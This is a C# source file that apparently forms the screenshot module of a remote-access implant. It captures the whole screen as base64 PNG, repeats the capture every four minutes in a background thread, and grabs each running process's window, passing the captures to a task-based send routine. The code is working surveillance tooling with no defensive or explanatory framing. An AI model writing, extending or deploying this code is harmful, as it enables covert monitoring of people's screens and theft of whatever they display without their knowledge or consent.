using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Core.Host
{
    internal static class Screenshot
    {
        internal static int screenshotInterval = 240000;
        internal static bool screenshotEnabled = false;

        internal static void GetScreenshot(int width = 0, int height = 0)
        {
            try
            {
                if (width == 0 && height == 0)
                {
                    width = SystemInformation.VirtualScreen.Width;
                    height = SystemInformation.VirtualScreen.Height;
                }

                var bitmap = new Bitmap(width, height);
                var graphics = Graphics.FromImage(bitmap);
                var size = new Size(width, height);
                graphics.CopyFromScreen(0, 0, 0, 0, size);
                var imageMemoryStream = new MemoryStream();
                bitmap.Save(imageMemoryStream, System.Drawing.Imaging.ImageFormat.Png);
                Console.WriteLine(Convert.ToBase64String(imageMemoryStream.ToArray()));
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e}\n");
            }
        }

        internal static void GetScreenSize()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                Console.WriteLine($"PrimaryScreen.Bounds.Width: {bounds.Width}");
                Console.WriteLine($"PrimaryScreen.Bounds.Height: {bounds.Height}");
                Console.WriteLine($"VirtualScreen.Width: {SystemInformation.VirtualScreen.Width}");
                Console.WriteLine($"VirtualScreen.Height: {SystemInformation.VirtualScreen.Height}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen size capture: {e.Message}\n");
            }
        }

        internal static void ScreenshotAllWindows()
        {
            try
            {
                var processes = System.Diagnostics.Process.GetProcesses();
                foreach (var p in processes)
                {
                    try
                    {
                        var windowHandle = p.MainWindowHandle;
                        Core.sendData(Core.getCurrentTaskId(), Encoding.UTF8.GetBytes(WindowStation.CaptureCSSingle(windowHandle)));
                    }
                    catch (Exception e)
                    {
                        Console.Write("[-] Error taking screenshot of all windows: " + e.Message);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e.Message}\n");
            }
        }

        internal static void RunMultiScreenshot(int width = 0, int height = 0)
        {
            try
            {
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        while (screenshotEnabled)
                        {
                            GetScreenshot(width, height);
                            Thread.Sleep(screenshotInterval);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Write("[-] Error taking multi-screenshot: " + e.Message);
                    }
                });
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform multi screenshot: {e}");
            }
        }
    }
}